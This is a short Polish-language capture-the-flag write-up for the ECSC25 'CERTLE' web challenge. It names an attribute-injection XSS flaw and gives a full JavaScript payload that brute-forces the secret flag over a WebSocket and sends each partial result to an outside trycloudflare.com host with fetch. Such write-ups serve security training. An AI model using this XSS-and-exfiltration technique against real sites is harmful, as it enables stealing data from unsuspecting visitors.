# CERTLE - web

### Vulnerability

XSS przez ustawianie atrybutów

### Solution

Użyć atrybutu `style` żeby powiększyć div'a na cały ekran i ustawić `onmouseover` na skrypt brutujący literkę po literce:
```javascript
fetch("/report", {
    method: "POST",
    body: JSON.stringify({ "url": "https://certle.ecsc25.hack.cert.pl/#" + btoa(JSON.stringify([{
        "letter": "a",
        "attributes": {
          "class": "cell font-monospace green",
          "style": "background:red;position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:99999;",
          "onmouseover": `
          let ws = new WebSocket(\`wss://\${window.location.host}/ws\`);
          ws.receive = (data) => {
              ws.send(data);
              return new Promise(function(resolve, reject) {
                  ws.onmessage = (message) => {
                      return resolve(message.data);
                  }

                  ws.onerror = (error) => {
                      return reject(error);
                  }
            });
          }

          setTimeout(async () => {
            let flag = "ecsc25{crane_is_my_goto_word_how_about_you_";
            while (flag.at(-1) != "}") {
              let ok = false;
              for (let c of "abcdefghijklmnopqrstuvwxyz_{}0123456789") {
                const result = JSON.parse(await ws.receive('{"answer":"' + flag + c + 'a"}'));

                if (result.at(-2) === "green") {
                  flag += c;
                  if (result.at(-1) === "green") flag += "_";
                  fetch('https://xxxxx.trycloudflare.com/?x=' + encodeURIComponent(flag));
                  ok = true;
                  break;
                }
              }
              if (!ok) break;
            }
          }, 200);
          `,
        },
  }]))}),
  headers: new Headers({
    'Content-Type': 'application/json'
  })
});
```

Flaga: `ecsc25{crane-is-my-goto-word-how-about-you?}`
